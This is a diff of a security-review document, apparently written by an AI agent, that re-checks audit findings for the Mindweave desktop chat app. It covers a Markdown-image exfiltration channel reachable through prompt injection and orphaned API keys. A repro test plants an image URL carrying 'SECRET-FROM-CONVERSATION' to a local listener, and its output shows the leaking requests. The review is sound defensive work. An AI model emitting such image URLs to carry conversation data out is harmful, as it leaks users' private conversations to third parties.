@@ -54,13 +54,18 @@ What holds:
 
 Why medium rather than high:
 - Exfiltration needs a prompt injection that makes the model emit an image URL containing conversation text. Mindweave has no browsing, tool calls or file ingestion (evolution-seams.md:34: Chat Completions defaults to streaming only), so the only injection route is content the user pastes in.
-- The malicious-relay scenario adds little: a re … (cut; full text in the workflow journal)
+- The malicious-relay scenario adds little: a relay already receives the whole conversation and the user's IP.
+- What can leak is conversation or summary text in context, plus IP and read-time tracking on every reopen. API keys and other local data are not in model context.
+- The file:// path only displays a local image to the same user; nothing is sent anywhere. It is not a file-read primitive for an attacker.
+- The Windows UNC/NTLM leak is speculation; the auditor did not test it and neither did I.
+
+It remains a genuine zero-click outbound channel in a local-first app, accepts plain http, and the fix is small. The recommendation (empty or data:-only handlers, or render images as alt text, plus a regression test) is sound.
 
 *Corrections to the finding.* 1. Severity high -> medium. The only injection route is hostile content the user pastes; the app has no browsing, tools or file ingestion. A malicious relay gains nothing it does not already have.
 2. "Read local files" in the title overstates impact. A file:// image is decoded and shown to the local user only; there is no path for its contents to leave the machine.
 3. The file:// load is not independently verified. The Program.cs currently in the scratchpad has no file:// case (an unused `localFile` variable and a local.png remain), so that part rests on the auditor's statement plus the library's documented LocalFile default handler.
 4. The Windows UNC/NTLM hash leak is untested speculation and should not count toward severity.
-5. The LaTeX \includegraphics and \href no-fetch result is confirmed by my re-run (only the two Markdown image GETs arrived). The current probe does not exercise … (cut; full text in the workflow journal)
+5. The LaTeX \includegraphics and \href no-fetch result is confirmed by my re-run (only the two Markdown image GETs arrived). The current probe does not exercise raw <img>, so that claim is unverified.
 
 <details><summary>Reproduction</summary>
 
@@ -103,7 +108,8 @@ The worktree was temporarily detached at track/claude-auto (1ba95c9) because the
 - The Windows `file://host/share` NTLM-hash leak remains untested, as the finding itself says; I could not test it on macOS.
 - "Fires again whenever the answer or a summary is reopened" was not verified. The package README says the loader uses an in-memory cache by default, so repeat fetches within one process run may be suppressed; a fetch after restart is likely but untested.
 - SummaryView was not exercised by a test. It uses the identical default renderer and the same Full-document path that the finished-answer test covers, so I consider it confirmed by code reading only.
-- The third-party- … (cut; full text in the workflow journal)
+- The third-party-relay scenario adds little: a malicious relay already sees the conversation. The meaningful vector is indirect prompt injection sending data to a different third party, plus IP and read-time disclosure.
+- The raw `<img>` and LaTeX `\includegraphics` / `\href` non-fetch claims were not re-tested.
 
 <details><summary>Reproduction</summary>
 
@@ -135,7 +141,38 @@ public async Task A_streaming_answer_with_a_markdown_image_does_not_contact_the_
 }
 
 [AvaloniaFact]
-public … (cut; full text in the workflow journal)
+public async Task A_finished_answer_with_markdown_images_neither_contacts_a_host_nor_reads_a_local_file()
+{
+    var local = Path.Combine(_dir, "local.png");
+    await File.WriteAllBytesAsync(local, Png, TestContext.Current.CancellationToken);
+    await using var app = DesktopHarness.Create();
+    var window = app.ShowWindow();
+    await app.StartWithWorkspaceAsync("火车");
+    await app.ConfigureModelAsync();
+    app.Client.Reply($"前文。\n\n![a](http://127.0.0.1:{Port}/stored.png?d=SECRET-FROM-CONVERSATION)\n\n![x]({new Uri(local).AbsoluteUri})\n\n后文。");
+    // ... send the question, wait until Messages[1].CanBranch and its AnswerView exists ...
+    List<Image> Loaded() => [.. window.GetVisualDescendants().OfType<AnswerView>().SelectMany(a => a.Renderer.GetVisualDescendants().OfType<Image>()).Where(i => i.Source is not null)];
+    await PumpAsync(3000, () => !_requests.IsEmpty && Loaded().Count >= 2);
+    // ...
+    Assert.True(requests.Length == 0 && loaded == 0,
+        $"Requests: [{string.Join(" | ", requests)}]; Image controls in the answer: {total}, with a loaded Source: {loaded}");
+}
+```
+
+Command, run in tests/Mindweave.Desktop.Tests: `dotnet test --filter "FullyQualifiedName~ReproMarkdownImageFetchTests"`
+
+Actual output:
+```
+Failed ...A_streaming_answer_with_a_markdown_image_does_not_contact_the_image_host [1 s]
+  Error Message:
+   Requests received while the answer was still streaming: GET /stream.png?d=SECRET-FROM-CONVERSATION HTTP/1.1
+Failed ...A_finished_answer_with_markdown_images_neither_contacts_a_host_nor_reads_a_local_file [177 ms]
+  Error Message:
+   Requests: [GET /stored.png?d=SECRET-FROM-CONVERSATION HTTP/1.1]; Image controls in the answer: 2, with a loaded Source: 2
+Failed!  - Failed:     2, Passed:     0, Skipped:     0, Total:     2, Duration: 1 s - Mindweave.Desktop.Tests.dll (net10.0)
+```
+
+The assertions are on whether a request happened at all, not on timing, so load on the machine does not affect the result.
 ```
 
 </details>
@@ -162,7 +199,15 @@ What holds:
 
 What is overstated:
 - "A saved API key cannot be removed" is too strong. Saving any replacement string retires the old reference and deletes the real secret from the OS store immediately (lines 95-97, 128, 153), unless an unfinished task still uses it. A leaked key can be pulled this way; what cannot be done is ending up with no key stored at all.
-- No requirement asks for a remove-key control. architecture.md:261 says there is no credential-version management UI and specifies only cleanup of replaced i … (cut; full text in the workflow journal)
+- No requirement asks for a remove-key control. architecture.md:261 says there is no credential-version management UI and specifies only cleanup of replaced items; v1 is a single active configuration. Scenario 1 is a missing feature, not a violation of the design.
+- The recommended "clear message when a restored database references a missing key" already exists generically: GenerationRequests.cs:150-152 fails with NotConfigured and "The API key for this connection is missing", and the Windows checklist (s6-windows-checklist.md:46) covers a key deleted outside the app.
+- Orphaned items stay in Keychain / Credential Manager under the same OS user, readable only by that user, so there is no confidentiality loss beyond what a current key already carries. Scenario 2 also needs an uncommon sequence (replace key, then restore an older backup).
+
+Related gaps the finding missed, which support the orphaning theme:
+- `CleanUpRetiredCredentialsAsync` is called only from `SaveAsync` (line 128) and one test. A retired key deferred because a task was unfinished is not deleted at startup or when the task ends; it waits for the next settings save, possibly forever.
+- `SaveAsync` writes the new key to the OS store (line 94) before `SaveActiveAsync` (line 109) and `SetRetiredCredentialRefsAsync` (line 126), with no compensation. A failure or crash after line 94 orphans the new reference; one between 109 and 126 orphans the old one.
+
+Net: a real hygiene gap (no way to reach a no-key state, several orphan paths, no sweep), but low severity rather than medium.
 
 *Corrections to the finding.* - "A saved API key cannot be removed from the app" should read "the app cannot reach a no-key state". Saving a replacement value deletes the previous secret from the OS store immediately, unless an unfinished task still references it.
 - The recommendation to show a clear message for a missing key after restore is already met generically (GenerationRequests.cs:150-152).
